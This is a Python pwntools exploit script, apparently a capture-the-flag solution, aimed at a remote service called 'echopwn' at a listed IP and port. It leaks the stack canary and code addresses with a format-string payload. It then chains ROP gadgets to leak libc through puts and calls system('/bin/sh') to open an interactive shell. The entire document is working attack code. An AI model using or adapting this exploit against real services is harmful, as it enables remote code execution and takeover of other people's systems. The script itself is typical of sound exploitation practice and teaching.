# Python3

from pwn import *

#binary = process("./echopwn")
binary = remote("168.119.247.237", 5011)
static_library = ELF("./.glibc/libc.so.6")
static_binary = ELF("./echopwn")

static_main_address = static_binary.symbols['main']
static_plt_puts_address = static_binary.plt['puts']
static_got_puts_address = static_binary.got['puts']
static_doread_address = static_binary.symbols['doRead']

static_library_puts = static_library.symbols['puts']
static_library_bin_sh = next(static_library.search(b'/bin/sh'))

# 0x0000000000000973 : pop rdi ; ret
pop_rdi_ret = 0x0000000000000973 

# 0x000000000000068e : ret
ret = 0x000000000000068e

offset_return_doRead_to_main_start = 0x908 - static_main_address

'''
print("Static main address ->" + str(hex(static_main_address)))
print("Static plt puts address ->" + str(hex(static_plt_puts_address)))
print("Static got puts address ->" + str(hex(static_got_puts_address)))
print("Static offset doread ->" + str(hex(offset_return_doRead_to_main_start)))
'''

## First gets is written at rbp-0x30
## Canary is placed ar rbp-0x8
## Second gets is written at rbp-0x3c

## Stage 1 of binary
# Leak canary and main return address of doRead we guess main's address and perform
# infinite iterations

print(binary.recv())

# Canary is at 13th position and return address is at 15th position
payload1 = "%13$lX.%15$lX"
binary.sendline(payload1)
response = binary.recv()

stack_canary = int(response.split(b".")[0].split(b"\n")[0].strip(),16)
dynamic_main_address = int(response.split(b".")[1].split(b"\n")[0].strip(),16) - offset_return_doRead_to_main_start
binary_absolute_dynamic_offset = dynamic_main_address - static_main_address

print("Canary is -> " + str(hex(stack_canary)))
print("Main address is -> " + str(hex(dynamic_main_address)))

dynamic_doread_address = p64(static_doread_address + binary_absolute_dynamic_offset)
dynamic_pop_rdi = p64(pop_rdi_ret + binary_absolute_dynamic_offset)
dynamic_ret = p64(ret + binary_absolute_dynamic_offset)
dynamic_got_puts = p64(static_got_puts_address + binary_absolute_dynamic_offset)
dynamic_plt_puts = p64(static_plt_puts_address + binary_absolute_dynamic_offset)

payload2 = b"A"*(0x3c-8) + p64(stack_canary) + b"B" * 0x8 + dynamic_pop_rdi + dynamic_got_puts + dynamic_plt_puts + p64(dynamic_main_address)

binary.sendline(payload2)

dynamic_puts_got = u64(binary.recv().split(b"\n")[0].strip().ljust(8, b"\x00"))
dynamic_glibc_offset = dynamic_puts_got - static_library_puts

dynamic_system = static_library.symbols['system'] + dynamic_glibc_offset

dynamic_bin_sh =  static_library_bin_sh+dynamic_glibc_offset

payload3= b""
payload4 = b"A"*(0x3c-8) + p64(stack_canary) + b"B" * 0x8 + dynamic_ret + dynamic_pop_rdi + p64(dynamic_bin_sh) + p64(dynamic_system)

binary.sendline(payload3)
binary.sendline(payload4)

binary.interactive()




